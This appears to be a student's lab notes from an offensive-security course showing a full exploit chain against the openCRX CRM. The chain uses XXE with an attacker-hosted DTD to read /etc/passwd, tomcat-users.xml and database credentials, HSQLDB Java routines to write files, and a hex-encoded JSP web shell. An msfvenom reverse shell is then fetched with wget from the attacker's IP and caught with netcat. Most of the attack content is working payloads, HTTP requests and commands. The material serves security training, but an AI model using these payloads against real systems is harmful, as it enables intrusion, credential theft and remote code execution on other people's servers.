{"@id":"statement","$":"INSERT INTO OOCKE1_ACCOUNT (citizenship_, modified_at, ext_code21_, children_names_, education, access_level_browse, external_link_, ext_code20_, account_category_, created_at, modified_by_, account_type_, access_level_update, religion_, ext_code27_, user_date_time4_, dtype, ext_code29_, first_name, user_date4_, ext_code22_, vcard, family_status, \"P$$PARENT\", user_boolean4_, category_, gender, owner_, business_type_, ext_code28_, account_state, access_level_delete, created_by_, last_name, user_string4_, account_rating, preferred_contact_method, partner_, closing_code, contact_, salutation_code, user_number4_, ext_code26_, ext_code25_, ext_code23_, full_name, user_code4_, preferred_written_language, ext_code24_, preferred_spoken_language, object_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"},{"@id":"values","$":"[0, Tue Feb 18 08:40:12 PST 2020, 0, 0, 0, 3, 1, 0, 0, Tue Feb 18 08:40:12 PST 2020, 1, 0, 2, 0, 0, 0, org:opencrx:kernel:account1:Contact, 0, Tom, 0, 0, BEGIN:VCARD\nVERSION:3.0\nUID:3743L6W72YVHM8WC6MBNJN12H\nREV:20200218T164012Z\nN:root:x:0:0:root:\/root:\/bin\/bash\ndaemon:x:1:1:daemon:\/usr\/sbin:\/usr\/sbin\/nologin\nbin:x:2:2:bin:\/bin:\/usr\/sbin\/nologin\nsys:x:3:3:sys:\/dev:\/usr\/sbin\/nologin\nsync:x:4:65534:sync:\/bin:\/bin\/sync\ngames:x:5:60:games:\/usr\/games:\/usr\/sbin\/nologin\nman:x:6:12:man:\/var\/cache\/man:\/usr\/sbin\/nologin\nlp:x:7:7:lp:\/var\/spool\/lpd:\/usr\/sbin\/nologin\nmail:x:8:8:mail:\/var\/mail:\/usr\/sbin\/nologin\nnews:x:9:9:news:\/var\/spool\/news:\/usr\/sbin\/nologin\nuucp:x:10:10:uucp:\/var\/spool\/uucp:\/usr\/sbin\/nologin\nproxy:x:13:13:proxy:\/bin:\/usr\/sbin\/nologin\nwww-data:x:33:33:www-data:\/var\/www:\/usr\/sbin\/nologin\n
...
Listing 41 - Error message excerpt one

It appears the XML parser was able to read the contents of /etc/passwd and the application attempted to insert it into the database in at least one field.

Let's keep scrolling through the error message. Near the end, we find a more specific exception and description.

"@exceptionClass":"java.sql.SQLDataException","@methodName":"sqlException","description":"data exception: string data, right truncation;  table: OOCKE1_ACCOUNT column: FULL_NAME","parameter":{"_item":[{"@id":"sqlErrorCode","$":"3401"},{"@id":"sqlState","$":"22001"}]},
Listing 42 - Error message excerpt two

A java.sql.SQLDataException2 usually indicates a data error occurred when an SQL statement was executed. We can use the "description" field to learn more about what kind of error we caused. A quick Google search for "string data, right truncation" reveals the likely cause of this error was attempting to insert data larger than a column's length.

Our exploit caused the XML parser to read the contents of /etc/password as illustrated by the SQL statement in 41. The contents of the file, however, were too large for the column size. Even though we failed to create a new contact, we can still examine the contents of the file we specified through the error message.


1
(openCRX, 2020), http://www.opencrx.org/opencrx/2.3/new.htm ↩︎

2
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/sql/SQLDataException.html ↩︎


Viewing root directory:
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

##### CDATA
We can use the XXE vulnerability to read simple files. However, we may encounter parser errors if we attempt to read files containing XML or key characters used in XML as delimiters, such as "<" and ">". We need to make sure that our XML content remains properly formatted after the file contents are inserted. Much like HTML, XML supports character escaping. We can't use this with external entities, however, since we aren't able to manipulate the content of the files we are attempting to include.

XML also supports CDATA1 sections in which internal contents are not treated as markup. A CDATA section starts with "<![CDATA[" and ends with "]]>". Anything between the tags is treated as text. If we can wrap file contents in CDATA tags, the parser will not treat it as markup, resulting in a properly-formatted XML file.

1
(Wikipedia, 2020), https://en.wikipedia.org/wiki/CDATA ↩︎

##### Updating the XXE Exploit
Let's create two new entities that will act as the opening and closing CDATA tags. We will receive an XML parser error if we try to concatenate three entities together, so we'll need an additional entity to act as a "wrapper" for the CDATA entities and the file content entity. However, we can't reference a single entity from another within the DTD in which they are defined. We will need to use parameter entities referenced by the "wrapper" entity in an external DTD file. An external DTD file can be a simple XML file containing only entity definitions.

Let's create a DTD file with the following content in the webroot (/var/www/html) of our Kali machine:

kali@kali:/opencrx$ sudo cat /var/www/html/wrapper.dtd 
<!ENTITY wrapper "%start;%file;%end;">
Listing 43 - wrapper.dtd

Once wrapper.dtd is in our webroot, we'll need to start our Apache2 service so the openCRX server can retrieve the file.

kali@kali:~/opencrx$ sudo systemctl start apache2
Listing 44 - Starting the apache2 service

Now we can update our payload to reference this DTD file on our Kali instance. Since the application is running on TomEE, let's see if we can can get TomEE user credentials by targeting the tomcat-users.xml file.

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
Listing 45 - Updated XXE payload

If everything works, the application's XML parser will download and parse wrapper.dtd. The wrapper entity defined in the DTD will be created, %start will be replaced with "<![CDATA[", %file will be replaced with the contents of tomcat-users.xml, and %end will be replaced with "]]>". The resulting value is placed in the lastName field. However, if the file contents are too large for that field, we should still be able to inspect the contents in the error message from the server.

Let's update our request in Repeater and click Send to submit it to the server. We'll receive an error response from the server containing the contents of the tomcat-users.xml file.

Figure 17: Using XXE to read tomcat-users.xml
Figure 17: Using XXE to read tomcat-users.xml
Excellent. Using the CDATA wrapper, we should be able to read any file on the server accessible by the application process.


```
POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
Host: opencrx:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://opencrx:8080/opencrx-rest-CRX/api-ui/index.html?url=http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api
Content-Type: application/xml
Origin: http://opencrx:8080
Content-Length: 412
Authorization: Basic Z3Vlc3Q6cGFzc3dvcmQ=
Connection: keep-alive
Cookie: JSESSIONID=C753034F5AB7F930F50D1438F11944EC

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.210:8000/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

##### Gaining Remote Access to HSQLDB
Now we understand how to use the XXE vulnerability to read the tomcat-users.xml file and retrieve the credentials within.

Our first instinct might be to go after the Tomcat Manager application and try to deploy a malicious WAR file. However, if we attempt to browse to the Tomcat Manager application on the openCRX server, we find that the default configuration restricts access to localhost.

Figure 18: Access Denied
Figure 18: Access Denied
We might also attempt to use the XXE to access Tomcat Manager with a Server-Side Request Forgery (SSRF)1 attack, but this also proves problematic. While there are users with the "tomcat" and "manager" roles, these are not the correct roles for the version of Tomcat on the server.2 Unable to leverage the XXE vulnerability to access Tomcat Manager, we'll need another attack vector.

Interestingly, the File class in Java can reference files and directories.3 If we modify our XXE payload to reference directories instead of files, it should return directory listings. We can use this to enumerate directories and files on the server.

Figure 19: Using XXE to get directory listings
Figure 19: Using XXE to get directory listings
We want to use this vulnerability to find files that can provide us with additional access or credentials. We can often find this information in config files, batch files, and shell scripts. After a search, we find several files related to the database at /home/student/crx/data/hsqldb/, including a file with credentials, dbmanager.sh.

Figure 20: Reading dbmanager.sh
Figure 20: Reading dbmanager.sh
A JDBC connection string in the file with a value of "jdbc:hsqldb:hsql://127.0.0.1:9001/CRX" lists a username of "sa" and a password of "manager99". The application appears to be using HSQLDB,4 a Java database. Let's familiarize ourselves with HQSLDB.

HSQLDB servers rely on Access Control Lists (ACLs) or network layer protections5 to restrict access beyond usernames and passwords. We can read the crx.properties file to determine if any ACLs are defined within HSQLDB itself.

Figure 21: Reading crx.properties
Figure 21: Reading crx.properties
There are no ACLs defined in the properties file. Without remote code execution on the server, we have no way of knowing if iptables rules are in place to prevent access to the database. Since the JDBC string referenced port 9001, let's do a quick nmap scan to find out if TCP port 9001 is open.

kali@kali:~/opencrx$ nmap -p 9001 opencrx
Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-17 10:37 CST
Nmap scan report for opencrx(192.168.121.126)
Host is up (0.00047s latency).

PORT     STATE SERVICE
9001/tcp open  tor-orport

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
Listing 46 - Using nmap to verify the HSQLDB port is open

The database port appears to be open and we have credentials, so let's try connecting to the database and determine what we can do with it. We will need an HSQLDB client in order to connect. We can download hsqldb.jar from the HSQLDB website,6 which includes a database manager tool.7

Once we have a copy of the jarfile on our Kali machine, we will use java to run it, use -cp to add the jar to our classpath, specify we want the GUI with org.hsqldb.util.DatabaseManagerSwing, connect to the remote database with --url, and set the credentials with --user and --password:

kali@kali:~/Documents/jarfiles$ java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
Listing 47 - Connecting to HSQLDB instance

After a few moments, a new GUI window should open.

Figure 22: HSQL Database Manager
Figure 22: HSQL Database Manager
We could query the database but perhaps we can find a way to do more, like write a file. HSQL does not have a function similar to MySQL's "SELECT INTO OUTFILE". However, the documentation reveals that HSQL custom procedures can call Java code.8


1
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Server-side_request_forgery ↩︎

2
(Apache Software Foundation, 2018), https://tomcat.apache.org/tomcat-8.0-doc/manager-howto.html#Configuring_Manager_Application_Access ↩︎

3
(Oracle, 2020), https://docs.oracle.com/javase/8/docs/api/java/io/File.html ↩︎

4
(The HSQL Development Group, 2020), http://hsqldb.org/ ↩︎

5
(The HSQL Development Group, 2020), http://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_security ↩︎

6
(Slashdot Media, 2020), https://sourceforge.net/projects/hsqldb/files/hsqldb/ ↩︎

7
(The HSQL Development Group, 2020), http://hsqldb.org/doc/2.0/util-guide/dbm-chapt.html ↩︎

8
(The HSQL Development Group, 2020), http://hsqldb.org/doc/2.0/guide/sqlroutines-chapt.html#src_jrt_routines ↩︎


```
POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
Host: opencrx:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://opencrx:8080/opencrx-rest-CRX/api-ui/index.html?url=http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api
Content-Type: application/xml
Origin: http://opencrx:8080
Content-Length: 391
Authorization: Basic Z3Vlc3Q6cGFzc3dvcmQ=
Connection: keep-alive
Cookie: JSESSIONID=C753034F5AB7F930F50D1438F11944EC

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.210:8000/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>

```


```
POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
Host: opencrx:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://opencrx:8080/opencrx-rest-CRX/api-ui/index.html?url=http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api
Content-Type: application/xml
Origin: http://opencrx:8080
Content-Length: 393
Authorization: Basic Z3Vlc3Q6cGFzc3dvcmQ=
Connection: keep-alive
Cookie: JSESSIONID=C753034F5AB7F930F50D1438F11944EC

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/crx.properties" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.45.210:8000/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&wrapper;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

##### Java Language Routines
We can call static methods of a Java class from HSQLDB using Java Language Routines (JRT).1 Like any Java program, the class needs to be in the application's classpath.2

We can only use certain variable types as parameters and return types. These types are mostly primitives and a few simple objects that map between Java types and SQL types.

Java is an object-oriented programming language. It does, however, have eight data types that are not objects, such as int or float. Primitives can be declared and assigned values without instantiating them as objects with the new keyword. This can be confusing because there are also object versions for each primitive, such as Integer or Float.

JRTs can be defined as functions or procedures. Functions can be used as part of a normal SQL statement if the Java method returns a variable. If the Java method we want to call returns void, we need to use a procedure. Procedures are invoked with a CALL statement.

The syntax to create functions and procedures is fairly similar, as we will observe later.

1
(The HSQL Development Group, 2020), http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_routines ↩︎

2
(Wikipedia, 2020), https://en.wikipedia.org/wiki/Classpath_(Java) ↩︎



##### Remote Code Execution
Let's create a proof-of-concept function that enables us to check system properties1 by calling the Java System.getProperty() method. Java uses these system properties to track configuration about its runtime environment, such as the Java version and the current working directory. The method call is relatively simple - it takes in a String value and returns a String value. We want something simple to verify we can create and run a function on the remote server, and we may find it useful later on to be able to view system properties.

 CREATE FUNCTION systemprop(IN key VARCHAR) RETURNS VARCHAR 
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:java.lang.System.getProperty'
Listing 48 - Defining a JRT function to call System.getProperty

Let's break down the code above. On the first line, we'll create a new function named "systemprop", which takes in a "key" value as a varchar and returns a varchar. Next, we'll tell the database to run the function as Java. And finally, we'll specify that we want the function to run the getProperty2 method of the java.lang.System class. The Java method expects a String value named "key". This must match the name of the variable passed after the IN keyword in the function we are defining.

To create the function on the openCRX server, we will enter the code above in the upper right window of the HSQL Database Manager GUI and click Execute SQL.

Figure 23: Creating an HSQL function
Figure 23: Creating an HSQL function
Once the function is created, we need to call it. However, functions are not the same as tables and we cannot select from them directly in a SELECT statement unless we are including a table. Instead, we can call the function using a VALUES clause without specifying a SELECT from a table. Let's pass in "java.class.path" as our parameter to check the classpath of the HSQLDB process.


```
VALUES(systemprop('java.class.path')
```
Figure 24: Invoking the systemprop function

The classpath we have to work with is very limited. Although hsqldb.jar is the only file listed, a Java process always has access to the default Java classes. If we want to use a function or procedure to do anything malicious, we'll need to find a suitable method in hsqldb.jar or the core Java JAR files.

We have the following restrictions:

The method must be static.
The method parameters must be primitives or types that map to SQL types.
The method must return a primitive, an object that maps to a SQL type, or void.
The method must run code directly or write files to the system.
In Java, all methods must include a return type. The void keyword is used when a method does not return a value.

We can use JD-GUI to search for methods that match these criteria. Prior to Java version 9, standard classes were stored in lib/rt.jar. While we could open this jar in JD-GUI, it would quickly become apparent that the search functionality doesn't cover method signatures. Our next option is to export the source files out of JD-GUI and open them with VS Code.

We will start our search with methods that are "public static" and return void. We will use the regular expression of "public static void \w+\(String" as our search term. This will search for:

the string "public static void"
followed by any number of "word" characters (a-zA-Z0-9)
followed by a parenthesis
followed by the word "String"
This search string will let us find any methods that are public, static, return void, and take a String as their first parameter. We will still need to do some manual inspection, but this should give us a good start. We will click the Use Regular Expression button to run the search.

Figure 25: Using VS Code to search for candidate methods
Figure 25: Using VS Code to search for candidate methods

```
egrep -ri "public static void \w+\(String"

```

Our search identified 215 results. Going through the results manually, we find that com.sun.org.apache.xml.internal.security.utils.JavaUtils inside /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar matches our criteria.

096  public static void writeBytesToFilename(String paramString, byte[] paramArrayOfByte) {
097    FileOutputStream fileOutputStream = null;
098      try {
099        if (paramString != null && paramArrayOfByte != null) {
100          File file = new File(paramString);
101           
102          fileOutputStream = new FileOutputStream(file);
103           
104          fileOutputStream.write(paramArrayOfByte);
105          fileOutputStream.close();
106        }
107        else if (log.isLoggable(Level.FINE)) {
108          log.log(Level.FINE, "writeBytesToFilename got null byte[] pointed");
109        }
110     
111      } catch (IOException iOException) {
112        if (fileOutputStream != null) {
113          try {
114            fileOutputStream.close();
115          } catch (IOException iOException1) {
116            if (log.isLoggable(Level.FINE)) {
117              log.log(Level.FINE, iOException1.getMessage(), iOException1);
118          }
119        } 
120      }
121    } 
122  }
Listing 49 - writeBytesToFilename method

This method seems to meet our criteria. It returns void, so we can call it from a procedure. Next, we need to pass in a string and a byte array. It creates a new file using the string value as its name (line 100) and writes the byte array to the file (line 104).

According to the HSQLDB documentation,3 we should be able to pass in string and byte array types from our query.

SQL Type	Java Type
CHAR or VARCHAR	String
BINARY	byte[]
VARBINARY	byte[]
Table 2 - SQL types to Java types

Since the method we plan to call returns void, let's create a new procedure. We'll use a VARCHAR for the paramString parameter and a VARBINARY for the paramArrayOfByte parameter. We could set the length of a BINARY field, however, the database would pad any value we submitted with zeroes. This might interfere with the file we want to create, so we'll use VARBINARY, which doesn't pad the value. Let's set the size of the VARBINARY as 1024 to give us enough room for a payload.

CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
  LANGUAGE JAVA 
  DETERMINISTIC NO SQL
  EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
Listing 50 - Procedure definition for writeBytesToFilename

The syntax to create a procedure is mostly the same as creating a function. After creating the procedure on the openCRX server, we'll invoke it using the CALL keyword, similar to stored procedures in other database software. However, first we need to convert our payload into bytes. Let's make this conversion using the Decoder tool in Burp Suite.

First, we will do a simple proof of concept to verify it works. We can encode "It worked!" as ASCII hex for our payload. We will not specify a file path as part of the paramString value.

call writeBytesToFilename('test.txt', cast ('497420776f726b656421' AS VARBINARY(1024)))
Listing 51 - Calling the writeBytesToFilename procedure

If everything works, we'll find a new file named test.txt in the database's working directory. We can call our systemprop function again to receive the working directory.

```
values(systemprop('user.dir'))
```
Figure 26: Checking the working directory
Now that we know the working directory, we can verify that the file was created with the XXE vulnerability.

Exercises
Create the writeBytesToFilename procedure and use it to write a file on the server.
Use the XXE vulnerability to verify the file was written correctly.
1
(Oracle, 2019), https://docs.oracle.com/javase/tutorial/essential/environment/sysprop.html ↩︎

2
(Oracle, 2018), https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#getProperty(java.lang.String) ↩︎

3
(The HSQL Development Group, 2020), http://hsqldb.org/doc/guide/sqlroutines-chapt.html#src_jrt_static_methods ↩︎

##### Finding the Write Location
Now that we can write files on the server, let's decide what to do with this exploit. We could try to upload a binary, but have no way to run it.

We previously examined the server's file structure with the tree command. In a black box test, we might leverage the XXE vulnerability to learn more about how the web application's files are set up in directory listings. If we knew where JSP files were stored on the server, we could potentially write our own JSP into that directory and access it with our browser.


##### Writing Web Shells
Now that we know where to write our files, we can use our writeBytesToFilename procedure to write a JSP command shell. If everything works, we should be able to access it from our browser.

We will use a webshell from Kali as the basis of our payload:

kali@kali:/usr/share/webshells/jsp$ cat cmdjsp.jsp
// note that linux = cmd and windows = "cmd.exe /c + cmd" 

<FORM METHOD=GET ACTION='cmdjsp.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>

<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>

<!--    http://michaeldaw.org   2006    -->
Listing 52 - cmdjsp.jsp

We'll need to update the shell to work on Linux and reduce its size to fit within 1024 bytes. Let's remove the HTML form element to save some space. We will use the Decoder tool again to convert the contents of our JSP webshell into ASCII hex. Once we have the converted value, we can call writeBytesToFilename and use a relative path to the opencrx-core-CRX directory with our shell filename.

call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp', cast('3c2540207061676520696d706f72743d226a6176612e696f2e2a2220253e0a3c250a202020537472696e6720636d64203d20726571756573742e676574506172616d657465722822636d6422293b0a202020537472696e67206f7574707574203d2022223b0a0a202020696628636d6420213d206e756c6c29207b0a202020202020537472696e672073203d206e756c6c3b0a202020202020747279207b0a20202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328636d64293b0a2020202020202020204275666665726564526561646572207349203d206e6577204275666665726564526561646572286e657720496e70757453747265616d52656164657228702e676574496e70757453747265616d282929293b0a2020202020202020207768696c65282873203d2073492e726561644c696e6528292920213d206e756c6c29207b0a2020202020202020202020206f7574707574202b3d20733b0a2020202020202020207d0a2020202020207d0a202020202020636174636828494f457863657074696f6e206529207b0a202020202020202020652e7072696e74537461636b547261636528293b0a2020202020207d0a2020207d0a253e0a0a3c7072653e0a3c253d6f757470757420253e0a3c2f7072653e' as VARBINARY(1024)))
Listing 53 - Writing a command shell with writeBytesToFilename

Finally, if we call our JSP and pass "hostname" as the cmd value in the querystring, we should receive the results of the command as shown in the listing below.

kali@kali:~$ curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=hostname

<pre>
opencrx
</pre>
Listing 54 - Calling the command shell with curl

Excellent! Now that we can execute commands on the server with our command shell, we can work towards a full interactive shell on the server.

Following shows .jsp files:

```
POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
Host: opencrx:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://opencrx:8080/opencrx-rest-CRX/api-ui/index.html?url=http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/:api
Content-Type: application/xml
Origin: http://opencrx:8080
Content-Length: 327
Authorization: Basic Z3Vlc3Q6cGFzc3dvcmQ=
Connection: keep-alive
Cookie: JSESSIONID=C753034F5AB7F930F50D1438F11944EC

<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/">
]>
<org.opencrx.kernel.account1.Contact>
  <lastName>&lastname;</lastName>
  <firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>
```

Taking following from cmdjsp.jsp (also updated for linux):

```
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";

   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s;
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>

<pre>
<%=output %>
</pre>
```
reated reverse shell:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.210 LPORT=4444 -f raw > shell.jsp
```
Then using webshell transferred to remote box. The folder was different. So checked the folder.

```
curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=pwd
```
Then transferred:
```
curl http://opencrx:8080/opencrx-core-CRX/shell.jsp?cmd=wget+http%3a//192.168.45.210%3a8000/revshell.jsp+-O+apps/opencrx-core-CRX/opencrx-core-CRX/revshell.jsp
```
Then ran:
```
curl http://opencrx:8080/opencrx-core-CRX/revshell.jsp
```
Gor reverse shell. Had to start netcat on port 4444 on kali box.

```
find / -type f -name rt.jar 2>/dev/null. This should give /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar 

```

